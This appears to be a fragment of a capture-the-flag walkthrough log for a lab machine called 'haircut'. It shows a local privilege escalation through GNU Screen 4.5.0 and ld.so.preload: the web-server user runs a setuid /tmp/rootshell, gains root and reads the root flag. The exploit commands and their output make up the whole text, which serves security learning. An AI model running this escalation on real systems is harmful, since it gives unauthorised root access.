+/tmp/libhax.sowww-data@haircut:/etc$ screen-4.5.0 -ls
+screen-4.5.0 -ls
+' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+No Sockets found in /tmp/screens/S-www-data.
+
+www-data@haircut:/etc$ screen-4.5.0 -ls
+screen-4.5.0 -ls
+No Sockets found in /tmp/screens/S-www-data.
+
+www-data@haircut:/etc$ ls ld.so.preload
+ls ld.so.preload
+ls: cannot access 'ld.so.preload': No such file or directory
+www-data@haircut:/etc$ ls -l /tmp/rootshell 
+ls -l /tmp/rootshell 
+-rwsr-xr-x 1 root root 8488 Nov 12 23:45 /tmp/rootshell
+
+GET ROOTSHELL
+www-data@haircut:/etc$ /tmp/rootshell 
+/tmp/rootshell 
+# id
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+
+GET ROOT FLAG
+# cat /root/root.txt
+cat /root/root.txt
+############################
+
